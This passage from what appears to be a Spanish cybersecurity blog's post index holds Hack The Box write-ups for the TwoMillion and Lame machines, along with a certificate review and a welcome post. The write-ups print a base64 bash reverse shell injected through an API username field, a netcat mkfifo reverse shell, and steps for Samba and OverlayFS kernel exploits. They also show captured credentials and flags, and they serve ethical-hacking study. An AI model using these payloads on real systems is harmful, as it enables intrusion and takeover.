es subir una reverse shell para control total. Codificamos el payload en base64 para evitar problemas de caracteres y lo ejecutamos: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjE=' | base64 -d | bash Luego mandamos la orden para ejecutar esto desde la API: curl -X POST http://2million.htb/api/v1/admin/vpn/generate \\ --cookie \"PHPSESSID=XXXX\" \\ --header \"Content-Type: application/json\" \\ --data '{\"username\":\"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjE= | base64 -d | bash;\"}' Y voil√†: shell remota con permisos de www-data. Desde aqu√≠ podemos explorar la m√°quina con tranquilidad. Credenciales en .env En la ra√≠z de la aplicaci√≥n encontramos un archivo .env con credenciales en texto plano, un cl√°sico error de seguridad: DB_HOST=127.0.0.1 DB_DATABASE=htb_prod DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 El archivo nos da credenciales para la base de datos y probablemente para el usuario admin. Verificamos el usuario en /etc/passwd: admin:x:1000:1000::/home/admin:/bin/bash Intentamos conexi√≥n SSH usando esas credenciales: ssh admin@10.10.11.221 # password: SuperDuperPass123 Acceso concedido. Ya tenemos la flag de usuario: cat user.txt b57dfb3467db8c5447c289ba9b8a85e1 Nada mal, un acceso limpio y sin complicaciones. Escalada de privilegios Explorando m√°s encontramos un email interno que menciona la vulnerabilidad OverlayFS CVE-2023-0386, conocida por permitir escalada de privilegios: That one in OverlayFS / FUSE looks nasty... Confirmamos versi√≥n vulnerable del kernel: uname -a Linux 2million 5.15.70-051570-generic #20220923 ... Descargamos y compilamos el exploit p√∫blico: zip -r cve.zip CVE-2023-0386/ scp cve.zip admin@2million.htb:/tmp unzip cve.zip cd CVE-2023-0386 &amp;&amp; make all ./fuse ./ovlcap/lower ./gc &amp; ./exp Tras ejecutar, mensaje de √©xito: [+] exploit success! Ahora somos root. Nos vamos directo a /root/ y leemos la flag final: cat /root/root.txt Resumen Enumeraci√≥n ‚Üí Encontramos APIs ocultas y rutas cifradas con ROT13, que fueron la puerta de entrada. Explotaci√≥n API ‚Üí Escalamos privilegios alterando par√°metros sin protecci√≥n. RCE ‚Üí Comandos arbitrarios en la generaci√≥n de VPN, conseguimos shell remota. LFI y credenciales ‚Üí Archivo .env con password admin nos dio acceso SSH. Escalada final ‚Üí Usamos CVE-2023-0386 para escalar a root. Una m√°quina sencilla pero did√°ctica, que combina malas configuraciones de API con una vulnerabilidad real de kernel para escalar. Ideal para aprender a no confiar en capas superficiales y siempre validar todo. ¬øQuieres m√°s writeups as√≠? S√≠gueme en LinkedIn o checa mi blog para estar al d√≠a y mejorar tus skills." }, { "title": "Mi experiencia con el certificado Google Cybersecurity", "url": "/posts/certificado-coursera/", "categories": "certificaciones, Ciberseguridad", "tags": "Google, Cybersecurity, certificaciones, Coursera", "date": "2025-07-19 00:00:00 -0600", "content": "Hace un tiempo decid√≠ dar un paso m√°s en mi camino dentro de la ciberseguridad y obtener el certificado Google Cybersecurity. Lo curioso es que al inicio ni siquiera sab√≠a si podr√≠a pagarlo. Mi plan era aprovechar al m√°ximo la semana gratuita de Coursera y ver hasta d√≥nde llegaba‚Ä¶ pero, contra todo pron√≥stico, termin√© complet√°ndolo. Antes de comenzar, debo aclarar algo: ya ten√≠a algo de experiencia previa. Hab√≠a visto cursos, le√≠do documentaci√≥n y experimentado por mi cuenta, as√≠ que muchos conceptos no me eran del todo nuevos. Sin embargo, lo interesante fue que, conforme avanzaba, iba recordando cosas que hab√≠a olvidado o que no ten√≠a tan frescas. El curso es bastante completo y bien estructurado, aunque no es muy pr√°ctico; en su mayor√≠a son explicaciones y tareas que te hacen reflexionar sobre situaciones reales. ¬øLo m√°s complicado para m√≠? Tal vez un poco las sentencias SQL. No porque fueran imposibles, sino porque me tom√≥ un momento adaptarme y recordar algunos detalles t√©cnicos. Aun as√≠, nada fue un obst√°culo real. En total, me tom√≥ alrededor de un mes completarlo, y al final logr√© obtener el certificado gracias a una beca de Santander, lo que fue un alivio enorme porque inicialmente no sab√≠a c√≥mo iba a costearlo. Mi conclusi√≥n: Es un curso ideal para reforzar bases. No es 100% pr√°ctico, pero te ayuda a organizar tus conocimientos. Si ya tienes algo de experiencia, lo terminas m√°s r√°pido y sin tanto esfuerzo. En mi caso, m√°s que aprender cosas nuevas, me ayud√≥ a formalizar lo que ya sab√≠a y a respaldarlo con un certificado reconocido. Si est√°s pensando en hacerlo, vale la pena, sobre todo si tienes acceso a una beca o lo encuentras con descuento. ¬øTienes dudas sobre este certificado o quieres saber si vale la pena para ti? Puedes escribirme y te cuento m√°s de mi experiencia." }, { "title": "Lame - Easy (HTB)", "url": "/posts/Lame/", "categories": "Writeups, HackTheBox", "tags": "HTB, Samba, CVE-2007-2447, Shell, Exploit, Root", "date": "2025-07-19 00:00:00 -0600", "content": "Lame - Easy Fecha: 03-04-2025 IP: 10.10.10.3 Estado: Resuelta Reconocimiento Iniciamos con un escaneo agresivo y completo de puertos, versiones y detecci√≥n de servicios: nmap -sC -sV --min-rate 5000 -p- -A 10.10.10.3 -oA Escaneo_Lame El par√°metro --top-ports 1000 tambi√©n podr√≠a usarse para limitar a los mil puertos m√°s comunes, pero aqu√≠ hicimos escaneo completo (-p-). Resultado: PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Ya desde el escaneo vemos algo interesante: el servicio FTP permite login an√≥nimo, y hay dos versiones potencialmente vulnerables: vsftpd 2.3.4 y Samba 3.0.20. Servicios encontrados vsftpd 2.3.4 Este FTP es conocido por tener una backdoor que se activa si se conecta con un nombre de usuario que incluya :), pero al intentar explotarlo con Metasploit, no conseguimos acceso. El exploit requiere autenticaci√≥n o conexi√≥n directa a un backdoor que, en esta m√°quina, parece estar desactivado o parchado. Intentamos con: msfconsole use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.3 run Pero no obtuvimos shell. Samba 3.0.20 Samba en esta versi√≥n es vulnerable a una ejecuci√≥n remota de comandos sin autenticaci√≥n. La vulnerabilidad es la CVE-2007-2447, y ya existen m√∫ltiples exploits p√∫blicos funcionales. Esta vulnerabilidad permite inyectar comandos mediante una configuraci√≥n maliciosa del nombre de usuario (por ejemplo, un nombre con comillas o ;). Usamos el siguiente repositorio de GitHub: https://github.com/xbufu/CVE-2007-2447 El payload que ejecuta por defecto es una reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 4242 &gt;/tmp/f Este comando crea un named pipe, ejecuta un shell interactivo y lo conecta a una direcci√≥n y puerto espec√≠ficos con netcat. Ejecuci√≥n del exploit Para correr el script, primero configuramos un entorno virtual, ya que requer√≠a paquetes espec√≠ficos de Python3: python3 -m venv env source env/bin/activate pip install -r requirements.txt Luego ejecutamos el exploit: python3 script.py --rhost 10.10.10.3 --lhost 10.10.14.12 --lport 4242 Y en otra terminal dejamos netcat escuchando: nc -lvnp 4242 Al correr el script, conseguimos una shell remota directamente como root, lo cual no es com√∫n en m√°quinas modernas pero s√≠ en vulnerabilidades antiguas como esta. Escalando y buscando flags Aunque ya √©ramos root, siempre es buena pr√°ctica verificar desde qu√© contexto entramos. Confirmamos que era una shell restringida (sh-3.2) pero con permisos de root. Buscamos la flag del usuario: find / -type f -name user.txt 2&gt;/dev/null Resultado: /home/makis/user.txt Leemos la flag: cat /home/makis/user.txt 4bf6b7c786fada55a27c97f2c28f4d0c Luego buscamos la de root: find / -type f -name root.txt 2&gt;/dev/null Y: /root/root.txt Le√≠da con: cat /root/root.txt 3a96686a0c6236e0b7cab109eba1df3c Resumen Escaneo inicial revel√≥ m√∫ltiples servicios vulnerables. El exploit para vsftpd 2.3.4 no funcion√≥, posiblemente parchado. Se identific√≥ Samba 3.0.20 vulnerable a CVE-2007-2447, con exploits p√∫blicos disponibles. Ejecutamos el exploit y obtuvimos shell como root sin necesidad de escalar privilegios. Le√≠mos ambas flags: user.txt y root.txt. Una m√°quina sencilla, ideal para principiantes. Demuestra la importancia de mantener servicios actualizados, ya que este tipo de vulnerabilidades son muy conocidas y peligrosas. ¬øQuieres m√°s writeups as√≠? S√≠gueme en LinkedIn o checa mi blog para estar al d√≠a y mejorar tus skills. ```" }, { "title": "Bienvenido a LogRob", "url": "/posts/bienvenido-a-logrob/", "categories": "Blog, Intro", "tags": "bienvenida, ciberseguridad, hacking", "date": "2025-07-18 22:00:00 -0600", "content": "¬°Hola! Bienvenido a LogRob, mi rinc√≥n en internet donde compartir√© mi camino en la ciberseguridad y el hacking √©tico. Aqu√≠ encontrar√°s desde notas r√°pidas, writeups de retos, algunos apuntes de que tengo y de como aprendo las cosas, hasta reflexiones y recursos √∫tiles para cualquiera que est√© aprendiendo sobre pentesting, redes y seguridad inform√°tica. ¬øPor qu√© este blog? Porque quiero documentar lo que voy aprendiendo, para que sirva como referencia tanto para m√≠ como para quien llegue aqu√≠ con la misma curiosidad. No esperes formalidades ni lenguaje complicado. Esto es aprendizaje en voz alta, tal cual como lo vivo. As√≠ que ponte c√≥modo, s√≠rvete un caf√© y prep√°rate para explorar conmigo." } ]
